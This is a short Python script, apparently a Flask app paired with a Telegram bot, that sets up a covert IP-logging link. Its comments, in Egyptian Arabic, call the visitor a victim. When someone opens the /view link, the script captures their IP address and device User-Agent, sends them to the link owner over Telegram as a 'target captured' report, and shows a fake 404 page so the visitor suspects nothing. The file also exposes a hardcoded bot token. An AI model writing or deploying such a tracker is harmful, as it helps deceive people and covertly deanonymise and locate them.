import telebot
from flask import Flask, request
import threading
import requests
import os

# --- الإعدادات (تأكد من التوكن بتاعك) ---
TOKEN = '8605823267:AAHFc9AjSXieqfCIY2JcJUZvsw9LgnrLeng'
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# صفحة رئيسية بسيطة عشان السيرفر يفضل صاحي
@app.route('/')
def home():
    return "<h1>System Status: ONLINE 🚀</h1>", 200

# رابط الصيد (الضحية بيدخل هنا)
@app.route('/view')
def capture():
    # بنسحب الـ ID بتاعك من الرابط عشان يبعتلك إنت
    owner_id = request.args.get('id')
    
    # سحب معلومات الضحية (IP ونوع الجهاز)
    ip_addr = request.headers.get('X-Forwarded-For', request.remote_addr)
    u_agent = request.headers.get('User-Agent')
    
    report = (
        "🔥 **NEW TARGET CAPTURED** 🔥\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 IP: `{ip_addr}`\n"
        f"📱 Device: `{u_agent[:100]}`\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    
    if owner_id:
        try:
            bot.send_message(owner_id, report, parse_mode='Markdown')
        except: pass
    
    # صفحة وهمية (404) عشان الضحية ما يشكش في حاجة
    return """<html><head><title>404 Not Found</title></head>
    <body style="text-align: center; padding-top: 100px; font-family: Arial;">
    <h1>404 Not Found</h1><p>The requested URL was not found on this server.</p>
    <hr style="width: 50%;"><address>Apache/2.4.41 (Ubuntu) Server at port 80</address>
    </body></html>""", 404

# تشغيل البوت في الخلفية
def run_bot():
    bot.polling(none_stop=True)

if __name__ == '__main__':
    # تشغيل البوت كـ thread عشان ما يعطلش السيرفر
    threading.Thread(target=run_bot).start()
    
    # إعدادات بورت السيرفر (مهمة جداً لـ Render)
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
  
